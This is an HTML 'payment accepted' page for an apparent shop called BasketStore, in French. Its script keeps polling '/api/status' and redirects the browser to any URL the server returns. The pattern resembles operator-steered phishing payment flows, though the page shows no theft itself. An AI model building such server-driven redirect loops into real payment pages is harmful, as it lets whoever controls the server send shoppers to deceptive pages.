<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Paiement accepté - BasketStore</title>
  <style>
    body {
      font-family: Arial;
      text-align: center;
      padding: 60px;
      background: linear-gradient(135deg, #e0ffe0, #b0ffb0);
    }
    h1 { color: #155724; }
    p { color: #155724; font-size: 1.2em; }
    button {
      margin-top: 30px;
      background: #007bff;
      color: white;
      border: none;
      padding: 12px 25px;
      border-radius: 8px;
      cursor: pointer;
    }
    button:hover { background: #0056b3; }
  </style>
</head>
<body>
  <h1>✅ Paiement accepté !</h1>
  <p>Merci pour votre achat.</p>
  <button onclick="window.location.href='/'">Voir un autre produit</button>

  <script>
    let checking = false, lastRedirect = null;
    async function checkStatus() {
      if (checking) return;
      checking = true;
      try {
        const res = await fetch('/api/status', { cache: 'no-store' });
        const data = await res.json();
        if (data.redirect && data.redirect !== lastRedirect) {
          lastRedirect = data.redirect;
          window.location.href = data.redirect;
          return;
        }
      } catch {}
      finally {
        checking = false;
        setTimeout(checkStatus, 2500);
      }
    }
    checkStatus();
  </script>
</body>
</html>
